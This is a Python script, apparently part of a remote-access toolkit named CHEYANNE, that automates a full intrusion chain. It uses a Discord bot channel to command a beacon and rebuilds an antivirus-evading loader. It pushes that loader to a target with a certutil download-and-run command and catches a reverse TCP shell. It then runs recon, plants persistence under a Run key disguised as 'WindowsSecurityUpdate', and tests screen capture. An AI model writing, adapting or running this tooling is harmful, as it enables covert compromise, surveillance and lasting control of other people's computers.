#!/usr/bin/env python3
"""
CHEYANNE auto_op.py — Full automated kill chain test
Drives delivery via live Discord beacon, catches TCP, runs persist.

Usage:  python auto_op.py
        python auto_op.py --skip-build   (reuse existing ghost_fud.exe)
        python auto_op.py --discord-only (no TCP wait, just verify beacon cmds work)
"""

import os
import sys
import json
import socket
import subprocess
import threading
import time
import urllib.request
import urllib.error
import argparse
import http.server
import functools
import textwrap

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

ROOT       = os.path.dirname(os.path.abspath(__file__))
SHELL_DIR  = os.path.join(ROOT, "shell")
ENV_FILE   = os.path.join(ROOT, ".env")

# ── config ──────────────────────────────────────────────────────────────────
MY_IP      = "192.168.1.92"
C2_PORT    = 4443
SERVE_PORT = 8890
BEACON_SID = "0aaa16cb"
DISCORD_CHANNEL = "1518584455411925193"

GREEN  = "\033[92m"
RED    = "\033[91m"
AMBER  = "\033[93m"
CYAN   = "\033[96m"
WHITE  = "\033[97m"
DIM    = "\033[2m"
BOLD   = "\033[1m"
RST    = "\033[0m"

_steps_passed = []
_steps_failed = []

def step(label):
    print(f"\n  {CYAN}{BOLD}[*]{RST} {label}")

def ok(label, detail=""):
    _steps_passed.append(label)
    print(f"  {GREEN}[+]{RST} {label}" + (f"  {DIM}{detail}{RST}" if detail else ""))

def fail(label, detail=""):
    _steps_failed.append(label)
    print(f"  {RED}[!]{RST} {label}" + (f"  {DIM}{detail}{RST}" if detail else ""))

def info(msg):
    print(f"  {DIM}    {msg}{RST}")


# ── env loader ────────────────────────────────────────────────────────────────

def load_env():
    env = {}
    if not os.path.exists(ENV_FILE):
        return env
    with open(ENV_FILE) as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#") and "=" in line:
                k, _, v = line.partition("=")
                env[k.strip()] = v.strip()
    return env


# ── Discord helpers ───────────────────────────────────────────────────────────

_DISCORD_HEADERS = {
    "User-Agent": "DiscordBot (https://github.com/rainfantry/cheyanne, 1.0)",
    "Content-Type": "application/json",
}


def _dheaders(token):
    return {**_DISCORD_HEADERS, "Authorization": f"Bot {token}"}


def discord_post(token, channel_id, text):
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
    data = json.dumps({"content": text}).encode("utf-8")
    req = urllib.request.Request(url, data=data, headers=_dheaders(token))
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, {}
    except Exception as ex:
        return 0, {"error": str(ex)}


def discord_read(token, channel_id, limit=15):
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages?limit={limit}"
    req = urllib.request.Request(url, headers=_dheaders(token))
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.loads(r.read())
    except Exception:
        return []


def send_beacon_cmd(token, channel_id, session_id, command):
    payload = json.dumps({"type": "cmd", "session": session_id, "command": command})
    status, _ = discord_post(token, channel_id, payload)
    return 200 <= status < 300


def wait_beacon_output(token, channel_id, session_id, timeout=20):
    """Poll Discord for {"type":"output","session":session_id,"data":"..."} response."""
    seen = {m.get("id") for m in discord_read(token, channel_id, limit=5)}
    deadline = time.time() + timeout
    while time.time() < deadline:
        time.sleep(2)
        for msg in reversed(discord_read(token, channel_id, limit=10)):
            mid = msg.get("id", "")
            if mid in seen:
                continue
            seen.add(mid)
            try:
                d = json.loads(msg.get("content", ""))
                if d.get("type") == "output" and d.get("session") == session_id:
                    return d.get("data", "")
            except Exception:
                pass
    return None


# ── file server ───────────────────────────────────────────────────────────────

def start_file_server(port=SERVE_PORT):
    try:
        handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=ROOT)
        handler.log_message = lambda *a: None
        srv = http.server.HTTPServer(("0.0.0.0", port), handler)
        t = threading.Thread(target=srv.serve_forever, daemon=True)
        t.start()
        return True
    except OSError:
        return False  # already in use — assume it's already running


# ── TCP listener ──────────────────────────────────────────────────────────────

_tcp_conn = None
_tcp_conn_lock = threading.Lock()


def _tcp_accept_thread(port):
    global _tcp_conn
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", port))
        srv.listen(1)
        srv.settimeout(90)
        conn, addr = srv.accept()
        with _tcp_conn_lock:
            _tcp_conn = (conn, addr)
    except socket.timeout:
        pass
    except OSError:
        pass
    finally:
        srv.close()


def wait_for_tcp(port=C2_PORT, timeout=90):
    global _tcp_conn
    _tcp_conn = None
    t = threading.Thread(target=_tcp_accept_thread, args=(port,), daemon=True)
    t.start()
    deadline = time.time() + timeout
    while time.time() < deadline:
        time.sleep(1)
        with _tcp_conn_lock:
            if _tcp_conn:
                return _tcp_conn
        print(f"  {DIM}    waiting for TCP callback... ({int(deadline - time.time())}s left){RST}", end="\r")
    return None


def tcp_send(conn, cmd):
    conn.sendall((cmd + "\n").encode("utf-8"))


def tcp_recv(conn, timeout=8):
    conn.settimeout(timeout)
    buf = b""
    try:
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            buf += chunk
            # stop when we see a PS prompt
            if b"> " in buf[-20:] or b"PS " in buf[-20:]:
                break
    except socket.timeout:
        pass
    return buf.decode("utf-8", errors="replace").strip()


def tcp_cmd(conn, cmd, timeout=10):
    tcp_send(conn, cmd)
    time.sleep(0.3)
    return tcp_recv(conn, timeout)


# ── build steps ───────────────────────────────────────────────────────────────

def rebuild_ghost_loader(ip, port):
    step("Building ghost_loader.exe with invisible PS1 (Israeli technique)")
    env = os.environ.copy()
    env["PYTHONIOENCODING"] = "utf-8"
    r = subprocess.run(
        [sys.executable, os.path.join(ROOT, "build_ghost_loader.py"), ip, str(port)],
        cwd=ROOT, env=env, capture_output=True, text=True,
        encoding="utf-8", errors="replace", timeout=120
    )
    exe = os.path.join(SHELL_DIR, "ghost_loader.exe")
    if os.path.exists(exe):
        sz = os.path.getsize(exe)
        ok("ghost_loader.exe built", f"{sz:,} bytes")
        return True
    else:
        fail("ghost_loader.exe build failed")
        if r.stderr:
            info(r.stderr[:300])
        return False


def rebuild_fud(ip, port):
    step("FUD mutation — fresh hash (Defender can't quarantine what it hasn't seen)")
    env = os.environ.copy()
    env["PYTHONIOENCODING"] = "utf-8"
    r = subprocess.run(
        [sys.executable, os.path.join(ROOT, "fud_auto.py"),
         "ghost", ip, str(port), "--scan-only", "--max", "3"],
        cwd=ROOT, env=env, capture_output=True, text=True,
        encoding="utf-8", errors="replace", timeout=180
    )
    # find output binary from last_fud.json
    last_json = os.path.join(ROOT, "fud_output", "last_fud.json")
    if not os.path.exists(last_json):
        fail("FUD build failed — no last_fud.json")
        info(r.stderr[:200] if r.stderr else r.stdout[-200:])
        return False
    with open(last_json) as f:
        meta = json.load(f)
    src = meta.get("binary", "")
    if not os.path.exists(src):
        fail("FUD binary not found", src)
        return False
    dst = os.path.join(SHELL_DIR, "ghost_fud.exe")
    import shutil
    shutil.copy2(src, dst)
    sz = os.path.getsize(dst)
    ok("ghost_fud.exe ready", f"seed={meta.get('seed')} | {sz:,} bytes | {meta.get('tag','')}")
    return True


# ── main op ───────────────────────────────────────────────────────────────────

def run(skip_build=False, discord_only=False):
    env = load_env()
    token = env.get("DISCORD_BOT_TOKEN", "")
    channel_id = env.get("DISCORD_C2_CHANNEL", DISCORD_CHANNEL)
    if not token:
        fail("No DISCORD_BOT_TOKEN in .env — abort")
        return

    print(f"\n  {GREEN}{BOLD}╔═══ CHEYANNE AUTO OP ══════════════════════════════════════════╗{RST}")
    print(f"  {GREEN}║  Israeli invisible PS1 + FUD → Discord beacon → TCP shell     ║{RST}")
    print(f"  {GREEN}╚═══════════════════════════════════════════════════════════════╝{RST}\n")

    # ── STEP 0: scan Discord for ANY recent beacon + pick freshest ──────────
    step("Scanning Discord for live beacons")
    msgs = discord_read(token, channel_id, limit=20)
    beacon_last = {}  # session_id -> timestamp string
    for m in msgs:
        try:
            d = json.loads(m.get("content", ""))
            if d.get("type") == "heartbeat":
                sid = d.get("session", "")
                ts = m.get("timestamp", "")
                if sid and sid not in beacon_last:
                    beacon_last[sid] = ts
        except Exception:
            pass

    if beacon_last:
        for sid, ts in beacon_last.items():
            info(f"session {sid}: last heartbeat {ts}")
        # use most recent beacon overall
        target_sid = max(beacon_last, key=lambda s: beacon_last[s])
        last_ts = beacon_last[target_sid]
        # check age: parse ISO timestamp
        import re
        m = re.match(r'(\d{4})-(\d{2})-(\d{2})T(\d{2}):(\d{2})', last_ts)
        if m:
            import datetime
            then = datetime.datetime(*[int(x) for x in m.groups()])
            now  = datetime.datetime.utcnow()
            age_h = (now - then).total_seconds() / 3600
            if age_h > 2:
                fail(f"Beacon {target_sid[:8]} last seen {age_h:.0f}h ago — machine likely off")
                info("Sending delivery cmd anyway — it'll execute when machine comes back")
                info("Keep this script running to catch TCP when Radon boots")
            else:
                ok(f"Beacon {target_sid[:8]} alive", f"{age_h:.1f}h ago")
    else:
        target_sid = BEACON_SID
        fail("No beacon heartbeats in last 20 channel messages — using default session ID")

    # ── STEP 1: build ────────────────────────────────────────────────────────
    if not skip_build:
        if not rebuild_ghost_loader(MY_IP, C2_PORT):
            fail("Build aborted — cannot continue without binary")
            return
        if not rebuild_fud(MY_IP, C2_PORT):
            fail("FUD aborted")
            return
    else:
        step("Skipping build (--skip-build flag)")
        fud_path = os.path.join(SHELL_DIR, "ghost_fud.exe")
        if os.path.exists(fud_path):
            ok("Using existing ghost_fud.exe", f"{os.path.getsize(fud_path):,} bytes")
        else:
            fail("ghost_fud.exe not found and --skip-build set — abort")
            return

    # ── STEP 2: file server ──────────────────────────────────────────────────
    step("Starting file server on port 8890")
    started = start_file_server(SERVE_PORT)
    if started:
        ok("File server started", f"http://{MY_IP}:{SERVE_PORT}/")
    else:
        ok("File server already running", f"port {SERVE_PORT} in use — assuming it's ours")

    # ── STEP 3: TCP listener (background) ───────────────────────────────────
    if not discord_only:
        step("TCP listener armed on port 4443")
        # start accept thread NOW so we don't miss the connection
        tcp_thread = threading.Thread(
            target=_tcp_accept_thread, args=(C2_PORT,), daemon=True
        )
        tcp_thread.start()
        ok("TCP listener armed", "waiting for callback...")

    # ── STEP 4: deliver via Discord beacon ──────────────────────────────────
    step(f"Sending delivery command to beacon {target_sid[:8]} via Discord")
    # CMD.EXE syntax — beacon runs via subprocess.run(shell=True) = cmd.exe /c
    full_cmd = (
        f'taskkill /F /IM ghost_loader.exe 2>nul & '
        f'certutil -urlcache -split -f "http://{MY_IP}:{SERVE_PORT}/shell/ghost_fud.exe" '
        f'"C:\\Users\\Public\\ghost_loader.exe" & '
        f'start /B "" "C:\\Users\\Public\\ghost_loader.exe"'
    )

    if send_beacon_cmd(token, channel_id, target_sid, full_cmd):
        ok("Delivery command sent to beacon")
        info(f"Beacon will: kill old loader → download ghost_fud.exe → start it")
    else:
        fail("Failed to send Discord command")
        return

    # ── STEP 5: wait for beacon output (confirms download happened) ─────────
    step("Waiting for beacon to confirm download (up to 30s)")
    output = wait_beacon_output(token, channel_id, target_sid, timeout=30)
    if output:
        ok("Beacon responded", repr(output[:120]))
    else:
        info("No beacon output received — beacon may be executing silently (normal)")

    if discord_only:
        ok("--discord-only: skipping TCP wait")
        _print_summary(token, channel_id)
        return

    # ── STEP 6: wait for TCP callback ───────────────────────────────────────
    step("Waiting for TCP callback (90s window)")
    print()
    result = None
    deadline = time.time() + 90
    while time.time() < deadline:
        time.sleep(1)
        with _tcp_conn_lock:
            if _tcp_conn:
                result = _tcp_conn
                break
        remaining = int(deadline - time.time())
        print(f"  {DIM}    TCP: listening on :4443 — {remaining}s remaining...{RST}   ", end="\r")
    print()

    if not result:
        fail("TCP: no connection received in 90s")
        info("Possible causes:")
        info("  → Defender quarantined ghost_fud.exe hash — rebuild with new seed")
        info("  → AMSI caught [scriptblock]::Create(shell_code) — need dark_room HWBP")
        info("  → Network issue (check file server 200 response in logs)")
        info("  → Ghost_loader already running from last attempt — duplicate send")
        _print_summary(token, channel_id)
        return

    conn, addr = result
    ok(f"TCP session established", f"{addr[0]}:{addr[1]}")

    # ── STEP 7: drain banner ─────────────────────────────────────────────────
    step("Reading session banner")
    time.sleep(0.5)
    banner = tcp_recv(conn, timeout=5)
    info(repr(banner[:200]))
    if "[G]" in banner or "COMPUTERNAME" in banner or "GHOST" in banner:
        ok("Shell banner received — ghost payload running")
    else:
        ok("Connected", "banner format unexpected but shell is live")

    # ── STEP 8: recon ────────────────────────────────────────────────────────
    step("Recon (running in TCP window — FAST before Defender behavioral kicks in)")
    for cmd in ["whoami", "hostname", "$env:COMPUTERNAME + ' | ' + $env:USERNAME + ' | ' + $PID"]:
        out = tcp_cmd(conn, cmd)
        label = cmd.split()[0]
        if out:
            ok(label, out.replace("\n", " ")[:80])
        else:
            fail(label, "no output")

    # ── STEP 9: persist ──────────────────────────────────────────────────────
    step("Setting persistence (HKCU Run key — fires on next login)")
    persist_cmd = (
        'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
        '/v WindowsSecurityUpdate /t REG_SZ '
        '/d "C:\\Users\\Public\\ghost_loader.exe" /f'
    )
    persist_out = tcp_cmd(conn, persist_cmd, timeout=10)
    if "completed successfully" in persist_out.lower() or "success" in persist_out.lower():
        ok("Persist set", "HKCU\\Run\\WindowsSecurityUpdate → ghost_loader.exe")
    else:
        info(f"Persist output: {repr(persist_out[:120])}")
        ok("Persist cmd sent (verify below)")

    # ── STEP 10: verify persist ──────────────────────────────────────────────
    step("Verifying persist key exists")
    verify_cmd = 'reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsSecurityUpdate'
    verify_out = tcp_cmd(conn, verify_cmd, timeout=8)
    if "ghost_loader.exe" in verify_out:
        ok("PERSIST VERIFIED", "key present in registry")
    else:
        fail("Persist key not found", repr(verify_out[:120]))

    # ── STEP 11: screenshot test ─────────────────────────────────────────────
    step("Screenshot capture test")
    ss_out = tcp_cmd(conn, "screen", timeout=15)
    if "[SCREEN]" in ss_out:
        ok("Screenshot: [SCREEN] data received")
    else:
        info("No screenshot data — shell may not have screen capture (normal for minimal shell)")

    conn.close()

    # ── SUMMARY ─────────────────────────────────────────────────────────────
    _print_summary(token, channel_id)


def _post_palpatine(token, channel_id, msg):
    """Post auto_op result to Discord #c2 so PALPATINE can respond."""
    try:
        data = json.dumps({"content": msg}).encode()
        req = urllib.request.Request(
            f"https://discord.com/api/v10/channels/{channel_id}/messages",
            data=data,
            headers={"Authorization": f"Bot {token}",
                     "Content-Type": "application/json",
                     "User-Agent": "DiscordBot (cheyanne, 1.0)"},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass


def _print_summary(token=None, channel_id=None):
    total = len(_steps_passed) + len(_steps_failed)
    print(f"\n  {BOLD}{'═'*60}{RST}")
    print(f"  {BOLD}RESULTS: {len(_steps_passed)}/{total} passed{RST}")
    if _steps_passed:
        for s in _steps_passed:
            print(f"  {GREEN}  ✓ {s}{RST}")
    if _steps_failed:
        for s in _steps_failed:
            print(f"  {RED}  ✗ {s}{RST}")
    print(f"  {BOLD}{'═'*60}{RST}\n")

    if token and channel_id:
        passed = len(_steps_passed)
        failed_list = ", ".join(_steps_failed) if _steps_failed else "none"
        status = "SUCCESS" if not _steps_failed else "PARTIAL" if passed else "FAILED"
        msg = (
            f"**[AUTO_OP] {status}** — {passed}/{total} steps passed\n"
            f"Failed: {failed_list}\n"
            + ("TCP shell connected. `interact <sid>` to use it." if "TCP session established" in _steps_passed
               else "TCP shell not connected. Type `diagnose` for next steps.")
        )
        _post_palpatine(token, channel_id, msg)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CHEYANNE auto kill-chain test")
    parser.add_argument("--skip-build", action="store_true",
                        help="Reuse existing ghost_fud.exe (skip build + FUD steps)")
    parser.add_argument("--discord-only", action="store_true",
                        help="Send delivery cmd only — do not wait for TCP")
    args = parser.parse_args()
    run(skip_build=args.skip_build, discord_only=args.discord_only)
